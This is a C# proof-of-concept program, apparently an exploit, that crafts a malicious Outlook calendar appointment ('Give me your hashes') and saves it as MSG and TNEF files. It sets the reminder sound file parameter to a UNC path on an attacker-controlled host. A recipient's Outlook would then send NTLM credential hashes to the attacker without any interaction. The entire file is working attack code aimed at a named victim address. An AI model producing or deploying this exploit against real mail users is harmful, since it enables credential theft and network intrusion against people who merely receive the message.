using Aspose.Email;
using Aspose.Email.Mapi;
using Aspose.Email.Tools.Logging;
using MsgKit;
using MsgKit.Enums;
using System;

namespace AppointmentPwn
{
    internal class Program
    {
        static void Log(string msg)
        {
            Console.Write(msg);
        }
        static void Main()
        {
            string outfilebase = @"outlook-pwn";
            Log("[*] Using output base filename `" + outfilebase + "`\n");
            Log("[+] Building malicious Appointment...");
            using (var appointment = new Appointment(
                new Sender("istvan.toth@company.net", "Istvan Toth"),
                new Representing("istvan.toth@company.net", "Istvan Toth"),
                "Give me your hashes"))
            {
                appointment.Recipients.AddTo("victim@company.net", "John Victim");
                appointment.Subject = "Give me your hashes";
                appointment.MeetingStart = DateTime.Now.Date;
                appointment.MeetingEnd = DateTime.Now.Date.AddDays(1).Date;
                appointment.AllDay = true;
                appointment.BodyText = "Thank you for sending me your NTLM hash";
                appointment.BodyHtml = "<html><head></head><body><b>Thank you for sending me your NTLM hash</b></body></html>";
                appointment.SentOn = DateTime.UtcNow;
                appointment.Importance = MessageImportance.IMPORTANCE_NORMAL;
                appointment.IconIndex = MessageIconIndex.UnsentMail;
                appointment.PidLidReminderFileParameter = @"\\attacker@80\file\not\exists\sound.wav";
                appointment.PidLidReminderOverride = true;
                Log("DONE.\n");
                Log("[+] Saving malicious Appointment as MSG file: " + outfilebase + ".msg...");
                appointment.Save(@"outlook-pwn.msg");
                Log("DONE.\n");

                // Show the appointment
                // System.Diagnostics.Process.Start(@"outlook-pwn.msg");

                Log("[+] Converting MSG to TNEF...");
                MapiMessage mapiMsg = MapiMessage.Load(outfilebase + ".msg");
                MailConversionOptions mco = new MailConversionOptions
                {
                    ConvertAsTnef = true
                };
                MailMessage message = mapiMsg.ToMailMessage(mco);
                Log("DONE.\n");
                Log("[+] Saving TNEF message as " + outfilebase + ".tnef...");
                message.Save(outfilebase + ".tnef");
                Log("DONE.\n");

            }
        }
    }
}
